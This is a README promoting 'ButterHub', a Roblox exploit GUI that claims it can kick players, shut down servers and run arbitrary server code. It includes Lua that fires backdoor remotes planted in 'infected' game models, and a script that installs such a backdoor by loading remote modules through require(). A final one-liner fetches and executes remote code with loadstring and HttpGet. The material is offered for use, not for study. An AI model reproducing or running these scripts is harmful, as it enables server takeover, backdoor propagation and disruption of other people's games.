# ButterHub

## ButterHub is a Roblox ServerSided and FE exploiting GUI, this GUI consists of a Server Side and FE Version. [Our Discord Server](https://discord.gg/xWYcdnECvw)

---

<p style="font-size:40px"><strong>Main Information</strong></p>

<p style="font-size:35px"><strong>Description</strong></p>

<p style="font-size:18px">
    <span>
    <strong>
        ButterHub
    </strong>
    </span>
    <span>
    is a Roblox Exploit GUI, this GUI has many options such as <code>Commands</code>, <code>Themes</code>, <code>Player Action</code>, and <code>More</code>! ButterHub is technically a Server Destroying but Fun Roblox GUI, it states if the game has FilteringEnabled 
    </span>
    <span style="color: rgb(0,255,0)">
    <strong>Enabled (True)</strong>
    </span>
    </span>
    or
    </span>
    <span style="color: rgb(255,0,0)">
    <strong>Disabled (False)</strong>
    </span>
    <br/>
    <br/>
</p>

---

<p style="font-size:18px">
    <span style="font-size: 35px">
    <strong>Versions</strong>
    </span>
    <br/>
    <br/>
    <span style="margin-left:40px;font-size:25px;">
    <strong>SS (ServerSide)</strong>
    </span>
    <br/>
    <span>
    The ServerSide version is the most powerful as it can, <code>Kick</code>, <code>Shutdown Server</code>, <code>Run Require Scripts</code>, <code>Run Client and Server Code</code>, and <code>More</code>! The ServerSide is the <strong>Main version</strong> of ButterHub, right now it is currently in <strong style="color:rgb(0,120,255)">BETA</strong>.
    </span>
    <br/>
    <br/>
</p>

<p style="font-size:18px">
    <span style="margin-left:40px;font-size:25px;">
    <strong>FE (FilteringEnabled)</strong>
    </span>
    <br/>
    <span>
    The FE version is the average strength GUI that runs only Client Code. It does have it advantages though as it has, <code>Script Hub</code>, <code>More Options</code>, and <code>More</code>! The FE Version is the <strong>Secondary version</strong> of ButterHub it is mostly used in Exploiting instead of just games, right now it is currently <strong style="color:rgb(255,0,0)">NOT DONE</strong>.
    </span>
    <br/>
    <br/>
</p>

---

# **How to Run**

## **SS (ServerSide)**

### This one only works in some games that have the Infected Models in them, it abuses remotes to initalize it to you.
### So do not get mad if it does not work in a lot of games. It will only work in games with 1: The model, 2: Backdoor to allow you to run SS code. (How to use is stated below)

```lua
-- [[
Made by Puro,#0224 on Discord,
Join Our Discord: https://discord.gg/xWYcdnECvw
]] --

for _, Remote in ipairs(game:GetService("JointsService"):GetDescendants()) do
    if (Remote.Name:match("%^\\*")) then
        Remote:FireServer()
    end
end
```

### **How to use the SS Code part**

```lua
-- [[
Made by Puro,#0224 on Discord,
Join Our Discord: https://discord.gg/xWYcdnECvw

THIS WILL ALLOW YOU TO USE THE GUI IF THE MODEL ISN'T IN THE GAME BUT YOU CAN EXECUTE SERVER CODE.
]] --

local Kill = Instance.new('RemoteEvent', game:GetService('JointsService'))
Kill.Name = "%^\\Kill Event" --// It is important that "%^\\" is somewhere in the game.
local End = Instance.new('RemoteEvent', game:GetService('JointsService'))
End.Name = "%^\\*End Kill" --// It is important that "%^\\*" is somewhere in the game.
Kill.OnServerEvent:Connect(function(player, initData)
    require(11566712898)(initData)()
end)
End.OnServerEvent:Connect(function(player)
    require(11566309513).load(player.Name)
end)
```

### You then execute the first script.

## **FE (FilteringEnabled)**

### This one works in all games, but games could patch it. All you need to do is run the github Repository.

```lua
loadstring(game:HttpGet("github_link"), true)()
```
